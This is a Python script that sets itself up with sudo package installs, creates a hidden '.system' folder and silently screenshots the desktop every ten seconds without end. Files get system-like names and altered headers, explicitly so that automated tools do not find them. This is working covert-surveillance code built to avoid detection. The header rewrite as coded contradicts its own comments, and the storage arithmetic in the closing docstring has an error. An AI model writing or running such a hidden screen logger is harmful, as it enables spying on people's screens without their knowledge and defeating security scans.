"""
Author: Satish Luintel
Copyrights: MIT License
Date : 09.March, 2021
"""

import time
import os
import datetime

try:
    os.system("pip3 install pyautogui")
    os.system("sudo apt-get install scrot")
    os.system("sudo apt-get install python3-tk python3-dev")
    os.system("sudo apt install imagemagick")
except Exception as e:
    print("Something happened",e)

import pyautogui 


################
# Loop Forever #
################

try:
    # make a directory usually not seen without Ctrl + H 
    os.system("mkdir .system")
except Exception as e:
    print("already exists.")

os.chdir(".system")

while True:

    date_d = datetime.datetime.utcnow()
    date_data_to_system = str(date_d.strftime("%Y-%m-%d-%H-%M-%S"))
    filename = "Ubuntu_bionic_x64_"+ date_data_to_system + "_.png"
    image = pyautogui.screenshot(filename)

    # reduce the size of the screenshot to save disk space
    # for a High Quality Image , increase the depth to 7-8. File size will be large in such case.
    try:
        os.system(f"convert -depth 3.6 {filename} {filename}")
    except Exception as e:
        print(e)
    
    # change the file such that automated tools do not find it.
    try:
        f = open(filename,"rb")
        a = f.read()
        f.close()

        intermediate = list(a)
        
        # our secret extension, say, TSC
        intermediate[1] = 80 #84
        intermediate[2] = 78 #83
        intermediate[3] = 71 #67

        print(intermediate)
        immut = bytes(intermediate)

        with open(filename,"wb") as bin_file:
            bin_file.write(immut)
        
        filename_new =  "Ubuntu_bionic_x64_"+ date_data_to_system + ".TSC"
        os.system(f"mv {filename} {filename_new}")

    except Exception as e:
        print("Something happened...!")

    # taking screenshots in a 10 second interval 
    time.sleep(10)
    

    """
    
    for N second interval, the Number of screenshots in 8 hours would be,

    number_of_screenshots = 8 * 60 * 60 / N 

    so, for 10 second interval, There will be 8*60*6 screenshots., i.e 2880 screenshots.
    If one screenshot is on average, 100kB size,
    2880 screenshots would yield about 2880*100 kB i.e 281 MB of data saved.

    i.e Size of Data = 28800 * Z / N

    where Z = average size of data
    N = interval in seconds


    so, 

    1 	 2812.5
    2 	 1406.25
    3 	 937.5
    4 	 703.125
    5 	 562.5
    6 	 468.75
    7 	 401.7857142857143
    8 	 351.5625
    9 	 312.5
    10 	 281.25
    11 	 255.6818181818182
    12 	 234.375
    13 	 216.34615384615384
    14 	 200.89285714285714

    """

